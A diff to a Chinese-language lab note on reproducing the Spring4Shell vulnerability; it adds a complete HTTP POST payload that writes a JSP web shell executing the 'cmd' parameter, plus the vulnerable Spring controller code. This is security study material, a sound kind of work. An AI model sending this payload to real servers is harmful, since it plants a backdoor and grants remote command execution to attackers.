@@ -59,7 +59,35 @@ tomcat换了之后依然没有成功。
 
 使用这个成功了：
 https://github.com/lunasec-io/Spring4Shell-POC
+```
+POST /java-sec-code-1.0.0/login3 HTTP/1.1
+Host: 192.168.183.129:8088
+User-Agent: python-requests/2.20.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 698
 
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+```
+
+对应代码：
+```java
+    @RequestMapping("/login2")
+    public void login2(@RequestBody User user) {
+        System.out.println(user.getUsername());
+        System.out.println(user.getPassword());
+    }
+
+
+    @RequestMapping("/login3")
+    public void login3(User user) {
+        System.out.println(user.getUsername());
+        System.out.println(user.getPassword());
+    }
+```
+其中login2这个endpoint要求请求的Content-Type是json类型。
 
 ### Ref
 - [CVE-2010-1622: Spring Framework execution of arbitrary code](https://seclists.org/fulldisclosure/2010/Jun/456)
